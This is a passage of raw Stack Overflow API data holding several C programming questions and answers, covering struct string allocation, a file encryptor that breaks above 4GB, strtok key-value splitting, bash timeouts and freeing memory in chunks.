"https://stackoverflow.com/questions/53288290/how-to-store-dynamic-string-in-a-struct-containing-char-pointer", "title": "How to Store dynamic string in a struct ** containing char * pointer", "body": "<p>Im currently working on a  problem to store data from an input file into a struct of the following format:</p>\n\n<pre><code>typedef struct school_{\n  char *name;\n  char *state;\n}School;\n</code></pre>\n\n<p>Im reading from an input file of the format :</p>\n\n<pre><code>name1, state1\nname2, state2\n</code></pre>\n\n<p>And I would like to store the data dynamically for each school in a struct via pointers as the length of the name is unknown. <strong>k is the number of lines in the file.</strong>\nSo far this is what I have:</p>\n\n<pre><code>void input_schools(FILE *IN, School **Sch, int k) { \n  int i, j;\n  char ch;\n\n  for (i=0; i&lt;k; i++)\n{ fscanf(IN, \"%c\", &amp;ch);\n  Sch[i].name = (char *)malloc(sizeof (char));\n\n  j = 0;\n  Sch[i].name[j] = ch;\n\n  while(ch != '-') {\n    fscanf(IN, \"%c\", &amp;ch);\n    j++;\n    Sch[i].name = (char *) realloc(Sch[i].name, sizeof(char)*(j+1));\n    Sch[i].name[j] = ch;\n  }\n\n}\nSch[i].name[j-1] = '\\0';\n</code></pre>\n\n<p>However I am receiving a seg fault which I'm assuming is from the way I'm trying to store \"ch\" when writing \"Sch[i].name[j]\" I have also tried Sch[i]->name[j] and been unsuccessful. I would appreciate any help in knowing the correct way to write the address to store the data? </p>\n\n<p>I call the function using :\n     input_schools(school_info,TOP100,school_size);\nwhere school info is the input file\nSchool *TOP100[school_size]; \nis top100\nand school_size is the number of lines in the file</p>\n"}, {"tags": ["c", "g++"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1542137646, "post_id": 53288269, "comment_id": 93458530, "body": "<code>long int len;</code> is probably too small, you should use <code>long long len;</code>. Same goes for offsets, sizes... in your code"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1542137663, "post_id": 53288269, "comment_id": 93458542, "body": "and your code isn&#39;t a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 11, "user_id": 10160286, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e439c8c17366f5b4659fa51008c6264?s=128&d=identicon&r=PG&f=1", "display_name": "alexander", "link": "https://stackoverflow.com/users/10160286/alexander"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1542137727, "post_id": 53288269, "comment_id": 93458580, "body": "I used long int len"}, {"owner": {"reputation": 4732, "user_id": 8477999, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f8172e1919af53269de92316dcf03a03?s=128&d=identicon&r=PG&f=1", "display_name": "Gem Taylor", "link": "https://stackoverflow.com/users/8477999/gem-taylor"}, "edited": false, "score": 1, "creation_date": 1542137828, "post_id": 53288269, "comment_id": 93458631, "body": "perhaps assert the <code>sizeof long int</code> on your build platform?"}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 1, "creation_date": 1542137915, "post_id": 53288269, "comment_id": 93458676, "body": "Why are you compiling c code with g++?"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1542137965, "post_id": 53288269, "comment_id": 93458701, "body": "long long is not long int."}, {"owner": {"reputation": 11, "user_id": 10160286, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e439c8c17366f5b4659fa51008c6264?s=128&d=identicon&r=PG&f=1", "display_name": "alexander", "link": "https://stackoverflow.com/users/10160286/alexander"}, "edited": false, "score": 0, "creation_date": 1542138393, "post_id": 53288269, "comment_id": 93458870, "body": "do you think it will make a difference? ill try it"}, {"owner": {"reputation": 161, "user_id": 7576758, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-985SkdQTZ7o/AAAAAAAAAAI/AAAAAAAACfQ/Byl2b0Cf0q0/photo.jpg?sz=128", "display_name": "Sydney Hauke", "link": "https://stackoverflow.com/users/7576758/sydney-hauke"}, "edited": false, "score": 0, "creation_date": 1542140393, "post_id": 53288269, "comment_id": 93459697, "body": "<i>Check</i> your return values, especially those of <code>fread</code> and <code>fwrite</code>. You might find very interesting informations. If the number of bytes read/written doesn&#39;t match the requested amount, you might check thereafter the error that might have occured by calling the function <code>ferror</code> as well as <code>perror</code>."}, {"owner": {"reputation": 1828, "user_id": 2584754, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/Q3gFD.jpg?s=128&g=1", "display_name": "sturcotte06", "link": "https://stackoverflow.com/users/2584754/sturcotte06"}, "edited": false, "score": 0, "creation_date": 1542141154, "post_id": 53288269, "comment_id": 93459992, "body": "Always use <code>size_t</code>"}, {"owner": {"reputation": 11, "user_id": 10160286, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e439c8c17366f5b4659fa51008c6264?s=128&d=identicon&r=PG&f=1", "display_name": "alexander", "link": "https://stackoverflow.com/users/10160286/alexander"}, "edited": false, "score": 0, "creation_date": 1542207492, "post_id": 53288269, "comment_id": 93486818, "body": "your answers have been very helpful, thanks"}, {"owner": {"reputation": 11, "user_id": 10160286, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e439c8c17366f5b4659fa51008c6264?s=128&d=identicon&r=PG&f=1", "display_name": "alexander", "link": "https://stackoverflow.com/users/10160286/alexander"}, "edited": false, "score": 0, "creation_date": 1542212351, "post_id": 53288269, "comment_id": 93489928, "body": "My mistake was apparently compiling the code using g++"}, {"owner": {"reputation": 11, "user_id": 10160286, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e439c8c17366f5b4659fa51008c6264?s=128&d=identicon&r=PG&f=1", "display_name": "alexander", "link": "https://stackoverflow.com/users/10160286/alexander"}, "edited": false, "score": 0, "creation_date": 1542212838, "post_id": 53288269, "comment_id": 93490228, "body": "i also added another &#39;long&#39; to the integer. maybe that did it"}], "owner": {"reputation": 11, "user_id": 10160286, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e439c8c17366f5b4659fa51008c6264?s=128&d=identicon&r=PG&f=1", "display_name": "alexander", "link": "https://stackoverflow.com/users/10160286/alexander"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 51, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1542139824, "creation_date": 1542137514, "last_edit_date": 1542139824, "question_id": 53288269, "link": "https://stackoverflow.com/questions/53288269/why-does-this-code-work-properly-only-on-files-below-4gb", "title": "Why does this code work properly only on files below 4GB", "body": "<p>The code has a simple task which is to decrypt / encrypt files and write the cipher into  a new file, which works perfectly for files below 4GB of size. Any files larger than 4GB (2^32Bytes), will produce files of 4GB (2^32 Bytes) and not the input file size. I already tried out the 64Bit extensions (fseeko64, fopen64, etc), it won't make a difference!\nBesides i have a simalar program, that doesn't seem to have this type of issue as it writes all data to the file at once and not in chunks. I used the same functions for both programs. I compiled it using g++ if that's relevant</p>\n\n<p>Any help would be appreciated.\nThank you</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nint i, a, pwlen, response;\nchar passwd[64];\n__uint8_t pwhash[512];\n__uint8_t *message;\nint tmp;\nchar *filename, *sourcefilename;\nlong int len;\nint chunk_length, round, chunkqu, rest;\nlong int file_length_counter;\nint progress;\n\n// functions init\nvoid password();\nvoid encrypt();\nvoid decrypt();\n\nint main(int argc, char **argv) {\n\n    // set chunksize\n    chunk_length = 4096*64;\n    // check arguments,\n    if (!argv[1]) {\n        printf(\"Usage: &lt;inputfile&gt; &lt;mode(x/o)&gt; &lt;sourcefile&gt;\\nRead documentation for more info\\n\");\n        return 0;\n    }\n    if (!argv[2]) {\n        printf(\"No mode specified. Exiting\\n\");\n        return 0;\n    }\n    if (*argv[2] != 'x' &amp;&amp; *argv[2] != 'o') {\n        printf(\"Bad argument. Exiting...\\n\");\n        return 0;\n    }\n    FILE *fileptr2;\n    fileptr2 = fopen(argv[3], \"rb\");\n    if (fileptr2 != NULL) {\n        printf(\"Source file already exists\\n\");\n        return 0;\n    }\n    sourcefilename = argv[3];\n\n    // open file in read mode to verify its existance\n    FILE *fileptr1;\n    fileptr1 = fopen(argv[1], \"rb\");\n    if (!fileptr1) {\n        printf(\"File does not exist or is not accessible\\n\"); \n        return 0;\n    }\n    filename = argv[1];\n\n    fseek(fileptr1, 0, SEEK_END);\n    len = ftell(fileptr1);\n    fseek(fileptr1, 0, SEEK_SET);\n\n    // request password and hash it\n    password();\n\n\n    // allocate memory for chunk_length\n    message = (__uint8_t*)malloc(chunk_length);\n    if (message == NULL) {\n        printf(\"Failed to allocate required memory\\n This may be caused by insufficient RAM\\n\"); \n        return 0;\n    }\n\n\n    // open output file\n    fileptr2 = fopen(sourcefilename,\"wb\");\n\n    // find out chunk quantity and length as well as the leftover \"chunk\"\n    file_length_counter =0;\n    round =0;\n    while (1) {\n        round++;\n        file_length_counter += chunk_length;\n        if (file_length_counter&gt;=len) {\n            rest=chunk_length-(file_length_counter-len);\n            chunkqu=round;\n            break;\n        }\n    }\n\n\n    // main routine\n    printf(\"Progress:\\n \");\n    for (round=1; round&lt;=chunkqu; round++) {\n        progress = round*100/chunkqu;\n        printf(\"\\r%d\\%%\", progress);\n        fseek(fileptr1, (round-1)*chunk_length, SEEK_SET);\n        fread(message, 1, chunk_length, fileptr1);\n        if (*argv[2] == 'x') {encrypt();}\n        if (*argv[2] == 'o') {decrypt();}\n        if (round==chunkqu) {\n            fseek(fileptr2, (round-1)*chunk_length, SEEK_SET);\n            fwrite(message, 1, rest, fileptr2);\n        }\n        else {\n            fseek(fileptr2, (round-1)*chunk_length, SEEK_SET);\n            fwrite(message, 1, chunk_length, fileptr2);\n        }\n    }\n\n\n    // cleanup and exit\n    printf(\"\\n\");\n    fclose(fileptr1);\n    fclose(fileptr2);\n    free (message);\n    return 0;\n}\n\nvoid password() {\n    int count, h1, h2, h3, h4, s1, s2, s3, s4, r1, r2;\n    count = 0;\n    int tmphash[512];\n\n    // request password\n    do {\n        if (count != 0) {\n            printf(\"Password must exceed 9 characters!\\n\");\n        }\n        printf(\"Enter Passphrase:\\n\");\n        fgets(passwd, 64, stdin);\n        count++;\n    } while (strlen(passwd) &lt;= 9);\n        pwlen = strlen(passwd) -1;\n\n    // initialise variables\n    s1 = 0;\n    s2 = 0;\n    s3 = 0;\n    s4 = 0;\n\n    // hash algorithm\n    for (i=0; i&lt;pwlen; i++) {\n        h1 = passwd[i];\n        h2 = passwd[pwlen-i];\n        h3 = passwd[pwlen];\n        h4 = i&lt;&lt;2;\n\n        for (a=0; a&lt;512; a++) {\n            if (i==0) {tmphash[a] = 0;}\n            s1 += i&amp;a;\n            s1 += h1^h4;\n            s2 += a^i;\n            s3 += h2&gt;&gt;i%3;\n            s4 += h3&lt;&lt;i%5;\n\n            r1 = s1^s2;\n            r2 = s3^s4;\n            r1 += r1&lt;&lt;i;\n            r2 += r2&gt;&gt;5;\n            tmphash[a] +=r1&amp;r2;\n            tmphash[a] %= 256;\n        }\n    }\n    for (i=0; i&lt;512; i++) {\n        pwhash[i] = tmphash[i];\n    }\n}\n\nvoid encrypt() {\n    for (i=0; i&lt;chunk_length; i++) {\n        tmp = message[i];\n        tmp += pwhash[i%512];\n        tmp %= 256;\n        message[i] = tmp;\n    }\n}\n\nvoid decrypt() {\n    for (i=0; i&lt;chunk_length; i++) {\n        tmp = message[i];\n        tmp += 256;\n        tmp -= pwhash[i%512];\n        tmp %= 256;\n        message[i] = tmp;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "strtok"], "comments": [{"owner": {"reputation": 2385, "user_id": 1009270, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/33fcdc9c0604cf69abb15e17840d2a3c?s=128&d=identicon&r=PG", "display_name": "john elemans", "link": "https://stackoverflow.com/users/1009270/john-elemans"}, "edited": false, "score": 0, "creation_date": 1542136307, "post_id": 53287894, "comment_id": 93457937, "body": "You have to write your own parser."}, {"owner": {"reputation": 3691, "user_id": 1808989, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/3884a2f2ee43a4681967493905dcc20c?s=128&d=identicon&r=PG", "display_name": "Andrew Sun", "link": "https://stackoverflow.com/users/1808989/andrew-sun"}, "edited": false, "score": 4, "creation_date": 1542136308, "post_id": 53287894, "comment_id": 93457938, "body": "You could just use <code>strchr</code> instead of <code>strtok</code>"}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1542136435, "post_id": 53287894, "comment_id": 93457992, "body": "Can&#39;t reproduce. <a href=\"http://coliru.stacked-crooked.com/a/913d3de1fdad058a\" rel=\"nofollow noreferrer\">coliru.stacked-crooked.com/a/913d3de1fdad058a</a>"}], "answers": [{"tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": true, "score": 3, "last_activity_date": 1542137067, "creation_date": 1542137067, "answer_id": 53288158, "question_id": 53287894, "link": "https://stackoverflow.com/questions/53287894/c-split-string-with-repeated-delimiter-char-into-2-substrings/53288158#53288158", "title": "C - Split string with repeated delimiter char into 2 substrings", "body": "<p>Your second <code>strtok()</code> should not use <code>=</code> as the delimiter. You would only do that if there were another <code>=</code> that ended the value. But the value ends at the end of the string. Use an empty delimiter for this part.</p>\n\n<pre><code>key = strtok(aux, \"=\");\nvalue = strtok(NULL, \"\");\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "is_accepted": false, "score": 0, "last_activity_date": 1542138291, "creation_date": 1542138291, "answer_id": 53288414, "question_id": 53287894, "link": "https://stackoverflow.com/questions/53287894/c-split-string-with-repeated-delimiter-char-into-2-substrings/53288414#53288414", "title": "C - Split string with repeated delimiter char into 2 substrings", "body": "<p><code>strtok</code> is probably overkill (and non-reentrant) when it's just one token. This will do,</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char **argv) {\n    char *key, *equals, *value;\n    if(argc != 2 || !(equals = strchr(key = argv[1], '=')))\n       return fprintf(stderr, \"KEY=VALUE\\n\"), EXIT_FAILURE;\n    value = equals + 1;\n    *equals = '\\0';\n    printf(\"key: &lt;%s&gt;; value: &lt;%s&gt;.\\n\", key, value);\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>Although <code>strtok</code> is probably easier to read. One may try <code>strsep</code>, but it is GNU C.</p>\n"}], "owner": {"reputation": 981, "user_id": 710274, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/79830d0df697e6b29d2c7db512392608?s=128&d=identicon&r=PG", "display_name": "Tony Ceralva", "link": "https://stackoverflow.com/users/710274/tony-ceralva"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 53288158, "answer_count": 2, "score": 0, "last_activity_date": 1542138291, "creation_date": 1542135928, "last_edit_date": 1542136063, "question_id": 53287894, "link": "https://stackoverflow.com/questions/53287894/c-split-string-with-repeated-delimiter-char-into-2-substrings", "title": "C - Split string with repeated delimiter char into 2 substrings", "body": "<p>I'm making a very simple C program that simulates the <strong>export</strong> command, getting an input with fgets().</p>\n\n<p>Input example:</p>\n\n<blockquote>\n  <p>KEY=VALUE</p>\n</blockquote>\n\n<p>Has to be converted to:</p>\n\n<pre><code>setenv(\"KEY\", \"VALUE\", 1);\n</code></pre>\n\n<p>That's easy to solve with something similar to this code:</p>\n\n<pre><code>key = strtok(aux, \"=\");\nvalue = strtok(NULL, \"=\");\n</code></pre>\n\n<p>The problem comes when the user input a value that start with one or several equals <code>=</code> characters. For example:</p>\n\n<blockquote>\n  <p>KEY===VALUE</p>\n</blockquote>\n\n<p>This should be converted to:</p>\n\n<pre><code>setenv(\"KEY\", \"==VALUE\", 1);\n</code></pre>\n\n<p>But with my current code it is converted to:</p>\n\n<pre><code>setenv(\"KEY\", NULL, 1);\n</code></pre>\n\n<p>How I can solve this?</p>\n\n<p>Thanks in advice.</p>\n"}, {"tags": ["c", "bash"], "comments": [{"owner": {"reputation": 51, "user_id": 5948072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5934d81f302fab3b447a9883e6e535a?s=128&d=identicon&r=PG&f=1", "display_name": "ab3rc", "link": "https://stackoverflow.com/users/5948072/ab3rc"}, "reply_to_user": {"reputation": 35704, "user_id": 4958, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6ca82d17e7496d3c20b9c8038f87ae49?s=128&d=identicon&r=PG", "display_name": "ShreevatsaR", "link": "https://stackoverflow.com/users/4958/shreevatsar"}, "edited": false, "score": 0, "creation_date": 1542136848, "post_id": 53287796, "comment_id": 93458183, "body": "Either one should suffice, the issue is that the syntax is breaking things. Line 5 is command not found."}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 5948072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5934d81f302fab3b447a9883e6e535a?s=128&d=identicon&r=PG&f=1", "display_name": "ab3rc", "link": "https://stackoverflow.com/users/5948072/ab3rc"}, "edited": false, "score": 0, "creation_date": 1542135968, "post_id": 53287834, "comment_id": 93457761, "body": "If I try that as a bash script I get command not found for timeout for timeout 10s /foo $1"}, {"owner": {"reputation": 5181, "user_id": 5529197, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6af647bacfb3f0b596c73b0e3b0dc4b1?s=128&d=identicon&r=PG&f=1", "display_name": "Afshin", "link": "https://stackoverflow.com/users/5529197/afshin"}, "edited": false, "score": 0, "creation_date": 1542135976, "post_id": 53287834, "comment_id": 93457764, "body": "isn&#39;t it better to use <code>-eq</code> in <code>if</code> statement?"}, {"owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "reply_to_user": {"reputation": 51, "user_id": 5948072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5934d81f302fab3b447a9883e6e535a?s=128&d=identicon&r=PG&f=1", "display_name": "ab3rc", "link": "https://stackoverflow.com/users/5948072/ab3rc"}, "edited": false, "score": 0, "creation_date": 1542138869, "post_id": 53287834, "comment_id": 93459049, "body": "@ab3rc If you are not working on GNU/Linux, you&#39;ll have to install the timeout command. Installing GNU coreutils will do it."}], "tags": [], "owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "is_accepted": false, "score": 4, "last_activity_date": 1542138789, "last_edit_date": 1542138789, "creation_date": 1542135628, "answer_id": 53287834, "question_id": 53287796, "link": "https://stackoverflow.com/questions/53287796/bash-how-to-check-if-a-c-program-times-out/53287834#53287834", "title": "Bash, how to check if a C program times out", "body": "<p>Use the <code>timeout</code> command:</p>\n\n<pre><code>timeout 10s ./foo\nif [ $? -eq 124 ] ; then\n    exit 0\nelse\n    exit 1\nfi\n</code></pre>\n\n<p>From <a href=\"https://linux.die.net/man/1/timeout\" rel=\"nofollow noreferrer\"><code>man timeout</code></a>:</p>\n\n<blockquote>\n  <p>If the command times out, and --preserve-status is not set, then exit with status 124.  Otherwise, exit with the status of COMMAND.   If\n         no  signal is specified, send the TERM signal upon timeout.  The TERM signal kills any process that does not block or catch that signal.\n         It may be necessary to use the KILL (9) signal, since this signal cannot be caught, in which case the exit status is 128+9  rather  than\n         124.</p>\n</blockquote>\n"}], "owner": {"reputation": 51, "user_id": 5948072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5934d81f302fab3b447a9883e6e535a?s=128&d=identicon&r=PG&f=1", "display_name": "ab3rc", "link": "https://stackoverflow.com/users/5948072/ab3rc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1542138789, "creation_date": 1542135423, "question_id": 53287796, "link": "https://stackoverflow.com/questions/53287796/bash-how-to-check-if-a-c-program-times-out", "title": "Bash, how to check if a C program times out", "body": "<p>I want to run a C program foo.c thats compiled to foo within a bash script and see check if it times out. </p>\n\n<p>There is one parameter to foo and the 10 second timeout.\nI want to check if the program foo times out or executes. If it times out I want to exit 0.</p>\n\n<pre><code>#!/bin/sh\n# -*-sh-*-\n/foo $1 10\nif [$? -eq 0]\n    then\n        exit 0;\nfi\nexit 1;\n</code></pre>\n"}, {"tags": ["c", "memory", "malloc", "free"], "comments": [{"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1542135653, "post_id": 53287741, "comment_id": 93457612, "body": "If you&#39;re allocating memory once up front, what do you think it even means to &quot;free&quot; it inside the loop? What is happening inside your DoSomeWork() function that you think you need to undo periodically?"}, {"owner": {"reputation": 7872, "user_id": 7841, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/3KsHr.png?s=128&g=1", "display_name": "Leonardo Herrera", "link": "https://stackoverflow.com/users/7841/leonardo-herrera"}, "edited": false, "score": 0, "creation_date": 1542135655, "post_id": 53287741, "comment_id": 93457613, "body": "You need to write your own memory allocator for what you want. Work in reverse order and call <code>brk()</code> and friends when needed."}, {"owner": {"reputation": 2647, "user_id": 9829403, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-RvgmsYSS48c/AAAAAAAAAAI/AAAAAAAAAAw/pUPnPAhmDec/photo.jpg?sz=128", "display_name": "Tim Randall", "link": "https://stackoverflow.com/users/9829403/tim-randall"}, "edited": false, "score": 2, "creation_date": 1542137324, "post_id": 53287741, "comment_id": 93458392, "body": "There are a couple of ways to do this. One is to continue allocating one large block at the system level, but use your own mechanism to control which of <i>your</i> objects gets to use which bit of <i>your</i> memory. For example, you might have an array of flags indicating which chunks of memory are in use at any given time. The other way is to break up your allocation into smaller pieces, freeing those (and potentially re-allocating them) when appropriate."}], "answers": [{"comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1542135482, "post_id": 53287784, "comment_id": 93457528, "body": "one can also use <code>realloc</code> with a smaller size. Not sure it frees a lot, though"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 1, "creation_date": 1542135508, "post_id": 53287784, "comment_id": 93457540, "body": "Also keep in mind that just because you <code>free</code> memory doesn&#39;t necessarily mean it will become available to the OS right away (or even soon)."}, {"owner": {"reputation": 5181, "user_id": 5529197, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6af647bacfb3f0b596c73b0e3b0dc4b1?s=128&d=identicon&r=PG&f=1", "display_name": "Afshin", "link": "https://stackoverflow.com/users/5529197/afshin"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1542135523, "post_id": 53287784, "comment_id": 93457551, "body": "@Jean-Fran&#231;oisFabre I thought that too, but problem with <code>realloc</code> is that it frees from end, not start. And what he wants is from start."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1542135661, "post_id": 53287784, "comment_id": 93457618, "body": "you could compute the array in reverse by 1000 chunks. it&#39;s ugly, though, lots of adds &amp; subs &amp; index magic. eeek"}], "tags": [], "owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "is_accepted": false, "score": 2, "last_activity_date": 1542186740, "last_edit_date": 1542186740, "creation_date": 1542135389, "answer_id": 53287784, "question_id": 53287741, "link": "https://stackoverflow.com/questions/53287741/c-how-to-free-sub-memory/53287784#53287784", "title": "C how to free sub memory?", "body": "<p>What you want can be achieved by allocating the program in smaller chunks.</p>\n\n<p>You have to adjust your algorithm to handle a bunch of small sub-arrays which you then can release after use.</p>\n\n<p>In this case, it might be useful to allocate the chunks in reversed direction to give the libc the chance to release the freed memory to the underlying OS.</p>\n\n<p>Let me enhance a bit here:</p>\n\n<p>Assume you want an array with 10000000 (10 million) entries. Instead of allocating it as one chunk as depicted in the question, it could be possible to have</p>\n\n<pre><code>#define CHUNKSIZE 10000\n#define ENTRYSIZE 8\n#define NUM_CHUNKS 1000\n\nvoid test(void)\n{\n    void** outer_array = malloc(NUM_CHUNKS * sizeof(void*))\n    for (int i = 0; i &lt; NUM_CHUNKS; i++) {\n        void * chunk = malloc(CHUNKSIZE * ENTRYSIZE);\n        outer_array[NUM_CHUNKS - 1 - i] = chunk;\n        // allocate them in reverse order\n    }\n\n    // now, set item #123456\n    size_t item_index = 123456;\n    // TODO check if the index is below the maximum\n    size_t chunk_index = item_index / CHUNKSIZE;\n    size_t index_into_chunk = item_index % CHUNKSIZE;\n    void * item_address = &amp;outer_array[chunk_index][index_into_chunk * ENTRY_SIZE];\n\n    // after having processed one chunk, you can free it:\n    free(outer_array[0]);\n    outer_array[0] = NULL;\n}\n</code></pre>\n\n<p>There are (roughly) two possibilities how a program can enhance the heap in order to allocate memory:</p>\n\n<ol>\n<li>It can obtain a completely new memory block from the OS, indepedent from the \"main address space\". Then it can use it for allocation and return it to the OS as soon as it is <code>free()</code>d. This happens in some allocators if the allocation size is above a certain threshold.</li>\n<li>It can enhance the program address space. Then, the new memory is added at the end. After <code>free()</code>ing the last memory block, the program address space can be reduced again. This happens in some allocators if the allocation size is below a certain threshold.</li>\n</ol>\n\n<p>This way, your program's memory footprint decreases over time.</p>\n"}], "owner": {"reputation": 1, "user_id": 10458798, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e2d39bfce96c3a4d60498760db4bef?s=128&d=identicon&r=PG&f=1", "display_name": "Voiilp2", "link": "https://stackoverflow.com/users/10458798/voiilp2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542186740, "creation_date": 1542135206, "question_id": 53287741, "link": "https://stackoverflow.com/questions/53287741/c-how-to-free-sub-memory", "title": "C how to free sub memory?", "body": "<p>I allocate a big memory , <code>char* test= malloc(10000000);</code> , then I put value on this memory , and do some work for each value. </p>\n\n<p>What I want is , each 1000 index, I want to release all the memory until it.</p>\n\n<p>For ex.</p>\n\n<pre><code>for(long i=0; i&lt;10000000;i++)\n   